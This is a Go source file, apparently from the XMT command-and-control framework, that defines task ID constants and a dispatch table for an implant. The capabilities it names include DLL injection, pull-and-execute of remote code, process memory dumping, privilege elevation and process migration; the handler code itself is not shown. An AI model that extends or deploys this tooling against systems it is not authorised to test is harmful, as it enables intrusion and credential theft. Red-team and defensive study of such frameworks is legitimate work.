// Package task is a simple collection of Task based functions that cane be
// tasked to Sessions by the Server.
//
// THis package is separate rom the c2 package to allow for seperation and
// containerization of Tasks.
//
// Basic internal Tasks are still help in the c2 package.
package task

import (
	"context"

	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// The Mv* Packet ID values are built-in task values that are handled
// directory before the Mux, as these are critical for operations.
//
// Tv* ID values are standard ID values for Tasks that are handled here.
const (
	MvRefresh uint8 = 0x07
	MvTime    uint8 = 0x08
	MvPwd     uint8 = 0x09
	MvCwd     uint8 = 0x0A
	MvProxy   uint8 = 0x0B
	MvSpawn   uint8 = 0x0C
	MvMigrate uint8 = 0x0D
	MvElevate uint8 = 0x0E
	MvList    uint8 = 0x0F
	MvMounts  uint8 = 0x10
	MvRevSelf uint8 = 0x11
	MvProfile uint8 = 0x12
	MvScript  uint8 = 0xF0 // TODO(dij): setup

	// Built in Task Message ID Values
	TvDownload    uint8 = 0xC0
	TvUpload      uint8 = 0xC1
	TvExecute     uint8 = 0xC2
	TvAssembly    uint8 = 0xC3
	TvZombie      uint8 = 0xC4
	TvDLL         uint8 = 0xC5
	TvCheckDLL    uint8 = 0xC6
	TvReloadDLL   uint8 = 0xC7
	TvPull        uint8 = 0xC8
	TvPullExecute uint8 = 0xC9
	TvRename      uint8 = 0xCA
	TvScreenShot  uint8 = 0xCB
	TvProcDump    uint8 = 0xCC
	TvProcList    uint8 = 0xCD
	TvRegistry    uint8 = 0xCE
	TvSystemIO    uint8 = 0xCF
)

// Mappings is an fixed size array that contains the Tasker mappings for each
// ID value.
//
// Values that are less than 22 are ignored. Adding a mapping to here will
// allow it to be executed via the client Scheduler.
var Mappings = [0xFF]Tasker{
	TvDownload:    taskDownload,
	TvUpload:      taskUpload,
	TvExecute:     taskProcess,
	TvAssembly:    taskAssembly,
	TvPull:        taskPull,
	TvPullExecute: taskPullExec,
	TvZombie:      taskZombie,
	TvDLL:         taskInject,
	TvCheckDLL:    taskCheck,
	TvReloadDLL:   taskReload,
	TvRename:      taskRename,
	TvScreenShot:  taskScreenShot,
	TvProcDump:    taskProcDump,
	TvProcList:    taskProcList,
	TvRegistry:    taskRegistry,
	TvSystemIO:    taskSystemIo,
}

// Tasklet is an interface that allows for Sessions to be directly tasked
// without creating the underlying Packet.
//
// The 'Packet' function should return a Packet that has the Task data or
// any errors that may have occurred during Packet generation.
//
// This function should be able to be called multiple times.
type Tasklet interface {
	Packet() (*com.Packet, error)
}

// Tasker is an function alias that will be tasked with executing a Job and
// will return an error or write the results to the supplied Writer.
// Associated data can be read from the supplied Reader.
//
// This function is NOT responsible with writing any error codes, the parent
// caller will handle that.
type Tasker func(context.Context, data.Reader, data.Writer) error